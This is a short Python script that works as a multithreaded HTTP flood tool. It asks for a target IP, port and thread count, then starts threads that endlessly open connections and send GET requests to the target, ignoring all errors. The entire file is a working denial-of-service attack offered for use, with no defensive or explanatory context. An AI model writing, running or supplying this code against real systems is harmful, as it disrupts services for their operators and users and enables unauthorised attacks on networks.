import socket
import threading

def attack(ip, port):
    while True:
        try:
            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            soc.connect((ip, port))
            request = f"GET / HTTP/1.1\r\nHost: {ip}\r\n\r\n"
            soc.sendall(request.encode('ascii'))
            soc.close()
        except Exception:
            pass

if __name__ == "__main__":
    ip = input("Target IP: ")
    port = int(input("Target Port: "))
    threads = int(input("Number of Threads: "))
    for i in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port))
        thread.daemon = True
        thread.start()
    input("Press Enter to stop...\n")
